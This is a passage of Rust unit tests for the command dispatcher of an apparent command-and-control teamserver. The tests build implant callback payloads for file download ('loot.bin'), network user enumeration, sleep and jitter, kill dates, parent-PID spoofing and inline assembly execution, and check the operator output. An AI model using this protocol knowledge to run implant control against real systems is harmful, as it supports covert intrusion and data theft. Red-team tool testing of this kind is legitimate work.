        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("No tokens inside the token vault".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_job_and_package_dropped_handlers_broadcast_agent_responses()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0xAABB_CCDD, [0x21; AGENT_KEY_LENGTH], [0x43; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut job_payload = Vec::new();
        add_u32(&mut job_payload, u32::from(DemonJobCommand::Resume));
        add_u32(&mut job_payload, 7);
        add_u32(&mut job_payload, 1);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandJob), 30, &job_payload)
            .await?;

        let event = receiver.recv().await.ok_or("job response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Successfully resumed job 7".to_owned()))
        );

        let mut dropped_payload = Vec::new();
        add_u32(&mut dropped_payload, 8192);
        add_u32(&mut dropped_payload, 4096);
        dispatcher
            .dispatch(
                0xAABB_CCDD,
                u32::from(DemonCommand::CommandPackageDropped),
                31,
                &dropped_payload,
            )
            .await?;

        let event = receiver.recv().await.ok_or("package dropped response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String(
                "A package was discarded by demon for being larger than PIPE_BUFFER_MAX (8192 > 4096)"
                    .to_owned(),
            ))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_net_and_transfer_handlers_format_operator_output()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x1122_3344, [0x12; AGENT_KEY_LENGTH], [0x34; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut open, 0);
        add_u32(&mut open, 0x44);
        add_u64(&mut open, 20);
        add_utf16(&mut open, "C:\\loot.bin");
        dispatcher.dispatch(0x1122_3344, u32::from(DemonCommand::CommandFs), 32, &open).await?;
        let _ = receiver.recv().await.ok_or("download progress event missing")?;

        let mut transfer_payload = Vec::new();
        add_u32(&mut transfer_payload, u32::from(DemonTransferCommand::List));
        add_u32(&mut transfer_payload, 0x44);
        add_u32(&mut transfer_payload, 10);
        add_u32(&mut transfer_payload, 1);
        dispatcher
            .dispatch(0x1122_3344, u32::from(DemonCommand::CommandTransfer), 33, &transfer_payload)
            .await?;

        let event = receiver.recv().await.ok_or("transfer response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("List downloads [1 current downloads]:".to_owned()))
        );
        assert!(message.info.output.contains("loot.bin"));
        assert!(message.info.output.contains("50.00%"));

        let mut net_payload = Vec::new();
        add_u32(&mut net_payload, u32::from(DemonNetCommand::Users));
        add_utf16(&mut net_payload, "WKSTN-01");
        add_utf16(&mut net_payload, "alice");
        add_u32(&mut net_payload, 1);
        add_utf16(&mut net_payload, "bob");
        add_u32(&mut net_payload, 0);
        dispatcher
            .dispatch(0x1122_3344, u32::from(DemonCommand::CommandNet), 34, &net_payload)
            .await?;

        let event = receiver.recv().await.ok_or("net response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Users on WKSTN-01: ".to_owned()))
        );
        assert!(message.info.output.contains("alice (Admin)"));
        assert!(message.info.output.contains("bob"));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_config_and_mem_file_handlers_update_agent_state_and_broadcast()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x5566_7788, [0x56; AGENT_KEY_LENGTH], [0x78; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut config_payload = Vec::new();
        add_u32(&mut config_payload, u32::from(DemonConfigKey::WorkingHours));
        add_u32(&mut config_payload, 0b101010);
        dispatcher
            .dispatch(0x5566_7788, u32::from(DemonCommand::CommandConfig), 35, &config_payload)
            .await?;

        let event = receiver.recv().await.ok_or("agent update missing")?;
        let OperatorMessage::AgentUpdate(_) = event else {
            panic!("expected agent update event");
        };
        let event = receiver.recv().await.ok_or("config response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("WorkingHours has been set".to_owned()))
        );
        assert_eq!(
            registry.get(0x5566_7788).await.and_then(|agent| agent.working_hours),
            Some(0b101010)
        );

        let mut mem_file_payload = Vec::new();
        add_u32(&mut mem_file_payload, 0xAB);
        add_u32(&mut mem_file_payload, 1);
        dispatcher
            .dispatch(0x5566_7788, u32::from(DemonCommand::CommandMemFile), 36, &mem_file_payload)
            .await?;

        let event = receiver.recv().await.ok_or("mem file response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Memory file ab registered successfully".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_config_handler_preserves_high_bit_working_hours()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x5566_7799, [0x56; AGENT_KEY_LENGTH], [0x78; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database.clone(),
            sockets,
            None,
        );
        let mut receiver = events.subscribe();
        let working_hours = 0x8000_002A;

        let mut config_payload = Vec::new();
        add_u32(&mut config_payload, u32::from(DemonConfigKey::WorkingHours));
        add_u32(&mut config_payload, working_hours);
        dispatcher
            .dispatch(0x5566_7799, u32::from(DemonCommand::CommandConfig), 37, &config_payload)
            .await?;

        let event = receiver.recv().await.ok_or("agent update missing")?;
        let OperatorMessage::AgentUpdate(_) = event else {
            panic!("expected agent update event");
        };
        let event = receiver.recv().await.ok_or("config response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("WorkingHours has been set".to_owned()))
        );
        let expected = Some(i32::from_be_bytes(working_hours.to_be_bytes()));
        assert_eq!(registry.get(0x5566_7799).await.and_then(|agent| agent.working_hours), expected);

        let persisted = database
            .agents()
            .get(0x5566_7799)
            .await?
            .ok_or_else(|| "agent should be persisted after config update".to_owned())?;
        assert_eq!(persisted.working_hours, expected);
        Ok(())
    }

    #[tokio::test]
    async fn builtin_config_handler_rejects_kill_date_exceeding_i64_range()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x5566_7800, [0x56; AGENT_KEY_LENGTH], [0x78; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database.clone(),
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut config_payload = Vec::new();
        add_u32(&mut config_payload, u32::from(DemonConfigKey::KillDate));
        add_u64(&mut config_payload, i64::MAX as u64 + 1);
        let error = dispatcher
            .dispatch(0x5566_7800, u32::from(DemonCommand::CommandConfig), 38, &config_payload)
            .await
            .expect_err("overflowing kill date config must be rejected");

        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload { command_id, ref message }
                if command_id == u32::from(DemonCommand::CommandConfig)
                    && message == "config kill date exceeds i64 range"
        ));
        assert_eq!(registry.get(0x5566_7800).await.and_then(|agent| agent.kill_date), None);
        let persisted =
            database.agents().get(0x5566_7800).await?.ok_or_else(|| {
                "agent should still exist after rejected config update".to_owned()
            })?;
        assert_eq!(persisted.kill_date, None);
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "rejected config update should not broadcast events"
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_sleep_ppid_and_assembly_handlers_update_state_and_broadcast()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0xCAFEBABE, [0x66; AGENT_KEY_LENGTH], [0x77; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut sleep_payload = Vec::new();
        add_u32(&mut sleep_payload, 60);
        add_u32(&mut sleep_payload, 15);
        dispatcher
            .dispatch(0xCAFEBABE, u32::from(DemonCommand::CommandSleep), 37, &sleep_payload)
            .await?;

        let event = receiver.recv().await.ok_or("sleep agent update missing")?;
        let OperatorMessage::AgentUpdate(_) = event else {
            panic!("expected agent update event");
        };
        let event = receiver.recv().await.ok_or("sleep response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Set sleep interval to 60 seconds with 15% jitter".to_owned()))
        );
        let updated = registry.get(0xCAFEBABE).await.ok_or("missing updated agent")?;
        assert_eq!(updated.sleep_delay, 60);
        assert_eq!(updated.sleep_jitter, 15);

        let mut ppid_payload = Vec::new();
        add_u32(&mut ppid_payload, 4242);
        dispatcher
            .dispatch(0xCAFEBABE, u32::from(DemonCommand::CommandProcPpidSpoof), 38, &ppid_payload)
            .await?;

        let event = receiver.recv().await.ok_or("ppid agent update missing")?;
        let OperatorMessage::AgentUpdate(_) = event else {
            panic!("expected agent update event");
        };
        let event = receiver.recv().await.ok_or("ppid response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Changed parent pid to spoof: 4242".to_owned()))
        );
        assert_eq!(
            registry.get(0xCAFEBABE).await.ok_or("missing updated agent")?.process_ppid,
            4242
        );

        let mut assembly_payload = Vec::new();
        add_u32(&mut assembly_payload, 0x2);
        add_utf16(&mut assembly_payload, "v4.0.30319");
        dispatcher
            .dispatch(
                0xCAFEBABE,
                u32::from(DemonCommand::CommandAssemblyInlineExecute),
                39,
                &assembly_payload,
            )
            .await?;

        let event = receiver.recv().await.ok_or("assembly response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Using CLR Version: v4.0.30319".to_owned()))
        );

        let mut versions_payload = Vec::new();
        add_utf16(&mut versions_payload, "v2.0.50727");
        add_utf16(&mut versions_payload, "v4.0.30319");
        dispatcher
            .dispatch(
                0xCAFEBABE,
                u32::from(DemonCommand::CommandAssemblyListVersions),
                40,
                &versions_payload,
            )
            .await?;

        let event = receiver.recv().await.ok_or("assembly versions response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("List available assembly versions:".to_owned()))
        );
        assert!(message.info.output.contains("v2.0.50727"));
        assert!(message.info.output.contains("v4.0.30319"));
        Ok(())
    }

    fn add_u32(buf: &mut Vec<u8>, value: u32) {
        buf.extend_from_slice(&value.to_le_bytes());
    }

    fn add_u64(buf: &mut Vec<u8>, value: u64) {
        buf.extend_from_slice(&value.to_le_bytes());
    }

    fn add_bytes(buf: &mut Vec<u8>, value: &[u8]) {
        add_u32(buf, u32::try_from(value.len()).unwrap_or_default());
        buf.extend_from_slice(value);
    }

    fn add_utf16(buf: &mut Vec<u8>, value: &str) {
        let mut encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_le_bytes).collect();
        encoded.extend_from_slice(&[0, 0]);
        add_bytes(buf, &encoded);
    }

    fn beacon_file_open(file_id: u32, expected_size: u32, remote_path: &str) -> Vec<u8> {
        let mut header = Vec::new();
        header.extend_from_slice(&file_id.to_be_bytes());
        header.extend_from_slice(&expected_size.to_be_bytes());
        header.extend_from_slice(remote_path.as_bytes());
        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonCallback::File));
        add_bytes(&mut payload, &header);
        payload
    }

    fn beacon_file_write(file_id: u32, chunk: &[u8]) -> Vec<u8> {
        let mut bytes = Vec::new();
        bytes.extend_from_slice(&file_id.to_be_bytes());
        bytes.extend_from_slice(chunk);
        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonCallback::FileWrite));
        add_bytes(&mut payload, &bytes);
        payload
    }

    fn beacon_file_close(file_id: u32) -> Vec<u8> {
        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonCallback::FileClose));
        add_bytes(&mut payload, &file_id.to_be_bytes());
        payload
    }

    fn filesystem_download_open(file_id: u32, expected_size: u64, remote_path: &str) -> Vec<u8> {
        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut payload, 0);
        add_u32(&mut payload, file_id);
        add_u64(&mut payload, expected_size);
        add_utf16(&mut payload, remote_path);
        payload
    }

    fn filesystem_download_write(file_id: u32, chunk: &[u8]) -> Vec<u8> {
        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut payload, 1);
        add_u32(&mut payload, file_id);
        add_bytes(&mut payload, chunk);
        payload
    }

    fn filesystem_download_close(file_id: u32, reason: u32) -> Vec<u8> {
        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut payload, 2);
        add_u32(&mut payload, file_id);
        add_u32(&mut payload, reason);
        payload
    }

    // -----------------------------------------------------------------
    // checkin_windows_arch_label
    // -----------------------------------------------------------------

    #[test]
    fn windows_arch_label_known_values() {
        let cases: &[(u32, &str)] =
            &[(0, "x86"), (9, "x64/AMD64"), (5, "ARM"), (12, "ARM64"), (6, "Itanium-based")];
        for &(value, expected) in cases {
            assert_eq!(
                checkin_windows_arch_label(value),
                expected,
                "arch value {value} should map to \"{expected}\""
            );
        }
    }

    #[test]
    fn windows_arch_label_unknown_falls_back() {
        for value in [2_u32, 3, 7, 8, 10, 11, 99, u32::MAX] {
            assert_eq!(
                checkin_windows_arch_label(value),
                "Unknown",
                "arch value {value} should map to \"Unknown\""
            );
        }
    }

    // -----------------------------------------------------------------
    // checkin_windows_version_label
    // -----------------------------------------------------------------

    #[test]
    fn windows_version_label_known_versions() {
        const WORKSTATION: u32 = 1;
        const SERVER: u32 = 3; // any value != VER_NT_WORKSTATION (1)

        let cases: &[((u32, u32, u32, u32, u32), &str)] = &[
            // (major, minor, product_type, service_pack, build) → expected prefix
            ((10, 0, SERVER, 0, 20_348), "Windows 2022 Server 22H2"),
            ((10, 0, SERVER, 0, 17_763), "Windows 2019 Server"),
            ((10, 0, WORKSTATION, 0, 22_000), "Windows 11"),
            ((10, 0, WORKSTATION, 0, 22_621), "Windows 11"),
            ((10, 0, SERVER, 0, 99_999), "Windows 2016 Server"),
            ((10, 0, WORKSTATION, 0, 19_045), "Windows 10"),
            ((6, 3, SERVER, 0, 0), "Windows Server 2012 R2"),
            ((6, 3, WORKSTATION, 0, 0), "Windows 8.1"),
            ((6, 2, SERVER, 0, 0), "Windows Server 2012"),
            ((6, 2, WORKSTATION, 0, 0), "Windows 8"),
            ((6, 1, SERVER, 0, 0), "Windows Server 2008 R2"),
            ((6, 1, WORKSTATION, 0, 0), "Windows 7"),
        ];
        for &((major, minor, product_type, sp, build), expected) in cases {
            let label = checkin_windows_version_label(major, minor, product_type, sp, build);
            assert_eq!(
                label, expected,
                "({major}, {minor}, {product_type}, {sp}, {build}) should produce \"{expected}\""
            );
        }
    }

    #[test]
    fn windows_version_label_appends_service_pack() {
        // Windows 7 workstation with SP1
        let label = checkin_windows_version_label(6, 1, 1, 1, 0);
        assert_eq!(label, "Windows 7 Service Pack 1");

        // Windows Server 2008 R2 with SP2
        let label = checkin_windows_version_label(6, 1, 3, 2, 0);
        assert_eq!(label, "Windows Server 2008 R2 Service Pack 2");
    }

    #[test]
    fn windows_version_label_no_service_pack_suffix_when_zero() {
        let label = checkin_windows_version_label(6, 1, 1, 0, 0);
        assert!(!label.contains("Service Pack"), "label should not contain service pack suffix");
    }

    #[test]
    fn windows_version_label_unknown_falls_back() {
        let label = checkin_windows_version_label(5, 1, 1, 0, 0);
        assert_eq!(label, "Unknown");

        // Build in Windows 11 range but wrong product type for 2022 or 2019
        let label = checkin_windows_version_label(99, 0, 1, 0, 0);
        assert_eq!(label, "Unknown");
    }

    #[tokio::test]
    async fn builtin_checkin_handler_records_agent_checkin_audit_entry()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database.clone(),
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let agent_id = 0xABCD_1234_u32;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        dispatcher.dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &[]).await?;

        let entries = database.audit_log().list().await?;
        let checkin_entry = entries.iter().find(|e| e.action == "agent.checkin").expect(
            "a checkin audit entry with action=\"agent.checkin\" should have been persisted",
        );
        assert_eq!(checkin_entry.actor, "teamserver");
        assert_eq!(checkin_entry.target_kind, "agent");
        assert_eq!(checkin_entry.target_id.as_deref(), Some("ABCD1234"));
        let details =
            checkin_entry.details.as_ref().expect("checkin audit entry must include details");
        assert_eq!(details["result_status"], "success");
        assert_eq!(details["command"], "checkin");
        assert_eq!(details["agent_id"], "ABCD1234");
        Ok(())
    }
}
